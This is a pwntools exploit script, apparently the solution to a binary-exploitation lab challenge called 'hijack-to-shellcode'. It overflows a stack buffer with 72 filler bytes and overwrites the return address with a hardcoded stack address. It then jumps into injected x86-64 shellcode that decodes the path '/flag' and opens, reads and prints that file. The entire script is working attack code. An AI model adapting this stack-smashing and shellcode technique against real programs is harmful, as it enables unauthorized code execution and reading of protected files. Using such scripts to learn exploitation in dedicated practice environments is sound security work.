from pwn import *

shellcode = b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$j\x02XH\x89\xe71\xd2\xb6@1\xf6\x0f\x05H)\xd4H\x89\xc71\xc0H\x89\xe6\x0f\x05H\x89\xc2j\x01Xj\x01_H\x89\xe6\x0f\x05'

payload = b""
payload += b"A" * 72
payload += p64(0x7fffffffdce8 + 8)
payload += shellcode

p = process("./binary-exploitation-hijack-to-shellcode", env={})

pause()

res = p.recvuntil(b"Send your payload (up to 4096 bytes)!\n")
print(res)

pause()

p.sendline(payload)

res = p.recvall()
print(res)
